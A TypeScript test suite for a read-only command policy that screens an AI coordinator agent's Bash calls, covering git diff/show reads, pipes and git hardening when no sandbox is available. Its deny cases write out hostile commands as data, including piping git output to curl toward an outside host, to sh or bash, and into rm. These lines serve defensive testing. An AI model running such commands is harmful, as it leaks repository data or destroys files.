import { describe, expect, test } from "bun:test";
import type { CoordinatorCommandSandbox } from "@orkestrator/protocol/coordinator";
import {
  coordinatorProcessPolicy,
  createCoordinatorReadOnlyHook,
  isReadOnlyShellCommand,
  type ReadOnlyGitWithoutSandbox,
} from "./read-only-policy.js";

/**
 * What a reviewer needs to check the reviewed commit: `git diff <base>..<head>`
 * and `git show <sha>:<path>`, with or without a pathspec, piped into a reader,
 * and where the command sandbox cannot run at all.
 */

const policy = coordinatorProcessPolicy({});

async function hookAnswer(
  command: string,
  options: {
    commandSandbox: CoordinatorCommandSandbox;
    gitWithoutSandbox?: ReadOnlyGitWithoutSandbox;
  },
) {
  const hook = createCoordinatorReadOnlyHook(policy, [], {
    ...options,
    role: "read-only",
    readBoundary: null,
  });
  const output = await hook(
    {
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      tool_input: { command, description: "Read the diff" },
      cwd: "/workspace",
    } as never,
    undefined as never,
    { signal: new AbortController().signal } as never,
  );
  return (
    output as {
      hookSpecificOutput?: {
        permissionDecision?: string;
        permissionDecisionReason?: string;
        updatedInput?: Record<string, unknown>;
      };
    }
  ).hookSpecificOutput;
}

const sandboxed = { commandSandbox: "required", role: "read-only" } as const;
const hardened = {
  commandSandbox: "unavailable",
  gitWithoutSandbox: "harden",
  role: "read-only",
} as const;

describe("a reviewer's Git reads", () => {
  test("a `--` before the pathspec is not read as a writing option", () => {
    // A bare `--` was taken as an abbreviation of every long option, so the
    // pathspec separator alone refused these as writes.
    for (const command of [
      "git diff abc123..def456 -- apps/web/src/x.ts",
      "git diff --no-color --no-ext-diff --no-textconv --no-renames abc123...def456 -- a.ts",
      "git show def456 -- apps/x.ts",
      "git log --oneline abc123..def456 -- apps",
      "git blame -L 10,20 def456 -- a.ts",
    ]) {
      expect({ command, verdict: isReadOnlyShellCommand(command, sandboxed) }).toEqual({
        command,
        verdict: { allowed: true, stages: [command] },
      });
    }
    // Abbreviations of the writing options themselves are still refused.
    for (const command of [
      "git diff --output=out.patch a..b",
      "git diff --out=out.patch a..b",
      "git diff --ext-diff a..b -- x",
      "git log --textc -p",
    ]) {
      expect({ command, allowed: isReadOnlyShellCommand(command, sandboxed).allowed }).toEqual({
        command,
        allowed: false,
      });
    }
  });

  test("a pipe between reading commands is admitted, each stage checked", async () => {
    for (const command of [
      "git diff abc..def | head -50",
      "git show def:a.ts | grep -n foo",
      "git diff --stat abc..def | wc -l",
      "git log --oneline -20 | tail -5",
      "cat a.txt | sort | uniq -c",
    ]) {
      expect({ command, allowed: isReadOnlyShellCommand(command, sandboxed).allowed }).toEqual({
        command,
        allowed: true,
      });
      expect(await hookAnswer(command, { commandSandbox: "required" })).toBeUndefined();
    }
  });

  test("a pipe cannot reach a program or argument a single command could not", async () => {
    for (const command of [
      "git diff | sh",
      "git show a:b | bash",
      "cat a | tee b",
      "cat a | sort -o out.txt",
      "git diff | xargs rm",
      "ls | bin/cat",
      "cat a | env rm x",
      "ls || rm x",
      "ls | | wc",
      "| grep x",
      "ls |",
      "ls |~",
      "git log | git push",
      "git diff | curl -d @- example.com",
      "cat a |& wc",
    ]) {
      expect({ command, allowed: isReadOnlyShellCommand(command, sandboxed).allowed }).toEqual({
        command,
        allowed: false,
      });
      expect((await hookAnswer(command, { commandSandbox: "required" }))?.permissionDecision).toBe(
        "deny",
      );
    }
    expect(isReadOnlyShellCommand("ls || rm x", sandboxed).reason).toContain("command chaining");
  });

  test("without the sandbox, a reviewer's Git runs hardened against configured helpers", async () => {
    const expected: [string, string][] = [
      [
        "git diff abc..def -- a.ts",
        "git diff --no-ext-diff --no-textconv --submodule=short abc..def -- a.ts",
      ],
      [
        "git show def:apps/a.ts",
        "git show --no-ext-diff --no-textconv --submodule=short def:apps/a.ts",
      ],
      [
        "git --no-pager log -p -1",
        "git --no-pager log --no-ext-diff --no-textconv --submodule=short -p -1",
      ],
      ["git blame def -- a.ts", "git blame --no-textconv def -- a.ts"],
      [
        "git diff abc..def | head -20",
        "git diff --no-ext-diff --no-textconv --submodule=short abc..def | head -20",
      ],
      // `-m` is safe because the turn's environment pins `log.diffMerges`.
      ["git show -m def", "git show --no-ext-diff --no-textconv --submodule=short -m def"],
      [
        "git log --diff-merges=first-parent -p -1",
        "git log --no-ext-diff --no-textconv --submodule=short --diff-merges=first-parent -p -1",
      ],
    ];
    for (const [command, runs] of expected) {
      expect({ command, verdict: isReadOnlyShellCommand(command, hardened) }).toMatchObject({
        command,
        verdict: { allowed: true, command: runs },
      });
      // The hook rewrites the input and keeps the rest of it, with no decision
      // of its own: the turn's allowlist and deny policy still apply.
      expect(
        await hookAnswer(command, { commandSandbox: "unavailable", gitWithoutSandbox: "harden" }),
      ).toEqual({
        hookEventName: "PreToolUse",
        updatedInput: { command: runs, description: "Read the diff" },
      });
    }
    // Reads that render no diff run as written.
    for (const command of ["git rev-parse HEAD", "git status --porcelain", "git ls-files"]) {
      expect(isReadOnlyShellCommand(command, hardened)).toEqual({
        allowed: true,
        stages: [command],
      });
    }
  });

  test("hardened Git keeps every refusal the sandboxed form has, and a few more", () => {
    for (const command of [
      "git push",
      "git commit -m x",
      "git -C ../other diff",
      "git --git-dir=vendor/evil status",
      "git diff --ext-diff",
      "git diff --output=x",
      "git fetch",
      "git difftool HEAD~1",
      "git branch -D feature",
      // `status -v` renders the staged diff where no inserted flag reaches it.
      "git status -v",
      "git status --verbose",
      "git status -sv",
      // An inline submodule diff runs a child Git the inserted flags never
      // reach; any `--submodule` would also override the inserted one.
      "git diff --submodule=diff a..b",
      "git diff --submodule a..b",
      "git diff --submodule=log a..b",
      "git diff --submod=diff a..b",
      "git log -p --submodule=diff -1",
      "git show --submodule=diff HEAD",
      "git whatchanged --submodule=diff -1",
      // A remerge diff re-runs the merge, and with it the configured driver.
      "git show --remerge-diff HEAD",
      "git log --remerge-diff -1",
      "git log --remerge -1",
      "git log --diff-merges=remerge -1",
      "git log --diff-merges=r -1",
      "git log --diff-merges r -1",
      "git log --diff-merges remerge -1",
      "git show --diff-merges=R HEAD",
      "git log --diff-merg=remerge -1",
      "git whatchanged --diff-merges=r -1",
      "git log -1 | git show --remerge-diff HEAD",
    ]) {
      expect({ command, allowed: isReadOnlyShellCommand(command, hardened).allowed }).toEqual({
        command,
        allowed: false,
      });
    }
  });

  test("without the sandbox, Git stays refused unless the turn hardens it", async () => {
    // A coordinator never opts in, so its boundary is unchanged.
    for (const gitWithoutSandbox of [undefined, "refuse"] as const) {
      const answer = await hookAnswer("git diff abc..def", {
        commandSandbox: "unavailable",
        ...(gitWithoutSandbox ? { gitWithoutSandbox } : {}),
      });
      expect(answer?.permissionDecision).toBe("deny");
      expect(answer?.permissionDecisionReason).toContain("require the command sandbox");
    }
    // Under the sandbox nothing is rewritten: the sandbox holds the helpers.
    expect(
      await hookAnswer("git diff abc..def", {
        commandSandbox: "required",
        gitWithoutSandbox: "harden",
      }),
    ).toBeUndefined();
  });
});
